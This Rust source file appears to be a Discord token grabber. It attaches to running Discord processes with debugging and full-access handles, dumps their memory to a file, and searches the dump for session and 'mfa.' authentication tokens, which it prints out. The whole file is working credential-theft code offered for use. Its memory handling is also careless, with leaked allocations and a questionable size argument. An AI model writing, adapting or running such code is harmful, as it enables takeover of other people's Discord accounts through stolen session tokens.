mod winapi;
mod discord;

use winapi::*;
use std::fs::File;
use std::io::Write;

struct MemRegion {
    start: u64,
    size: usize,
}

fn main() { unsafe {
    let mut file_dump = File::create("dump.bin").unwrap();
    let mut dump = Vec::<String>::new();

    for pid in discord::get_pids() {
        println!("Dumping [{}]", pid);

        if DebugActiveProcess(pid) == FALSE {
            println!("Failed with DebugActiveProcess");
            continue;
        };

        let h_proc: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
            println!("Failed with OpenProcess");
            DebugActiveProcessStop(pid);
            continue;
        }

        let mut regions = Vec::<MemRegion>::new();
        let mut address = 0u64;

        while address < 0x10000000 {
            let mbi = libc::malloc(std::mem::size_of::<MEMORY_BASIC_INFORMATION>()) as *mut MEMORY_BASIC_INFORMATION;
            let bytes = VirtualQueryEx(h_proc, address as LPCVOID, mbi, std::mem::size_of_val(&mbi) *30);
            if bytes == 0 {
                address += 4096;
                continue;
            }

            if (*mbi).State == MEM_COMMIT && (*mbi).Protect & PAGE_GUARD != PAGE_GUARD {
                regions.push(MemRegion {
                    start: (*mbi).BaseAddress as u64,
                    size: (*mbi).RegionSize,
                });
            }

            address += (*mbi).RegionSize as u64;
        }

        drop(address);

        for region in &regions[regions.len()*2/3..] {
            let mut buffer: Vec<u8> = vec![0 as u8; region.size];

            let mut size = *(libc::malloc(std::mem::size_of::<SIZE_T>()) as *mut SIZE_T);
            if ReadProcessMemory(h_proc, region.start as LPCVOID, buffer.as_mut_ptr() as *mut _ as LPVOID, buffer.len(), &mut size) == FALSE {
                println!("ReadProcessMemory() failed || {} < {}", size, region.size);
                drop(size);
                continue;
            }

            println!("written_size < region.size :: {} < {}", size, region.size);

            drop(size);

            let _ = file_dump.write(&buffer);
            dump.push(format!("{}", String::from_utf8_lossy(&buffer)));
            drop(buffer);
        }

        DebugActiveProcessStop(pid);
        CloseHandle(h_proc);
    }


    // Fuck regexes, they are S_L_O_W

    let mut token_normal_prefs = Vec::<String>::new();
    println!("Searching for prefs...");
    let id_marks = [r#""user":{"id":""#, r#"id""#];

    for line in dump.iter().rev() {
        for id_mark in id_marks.iter() {
            if let Some(pos) = line.find(id_mark) {
                let entry = base64::encode(&line[pos+id_mark.len()..pos+id_mark.len()+18]) + ".";
                if !token_normal_prefs.contains(&entry) {
                    token_normal_prefs.push(entry);
                }
            }
        }
    }

    println!("Found {} prefs", token_normal_prefs.len());

    println!("Searching for tokens...");
    let mut tokens = Vec::<&str>::new();
    for line in dump.iter() {
        if !token_normal_prefs.is_empty() {
            for pref in token_normal_prefs.iter() {
                if let Some(pos) = line.find(pref) {
                    let token = &line[pos..pos+59];

                    if !tokens.contains(&token) {
                        tokens.push(&line[pos..pos+59]);
                    }
                }
            }
        }

        if let Some(pos) = line.find("mfa.") {
            let token = &line[pos..pos+88];

            if !tokens.contains(&token) {
                tokens.push(&line[pos..pos+88]);
            }
        }

    }
    println!("DONE!");

    for token in tokens {
        println!("TOKEN: [{}]", token);
    }
} }
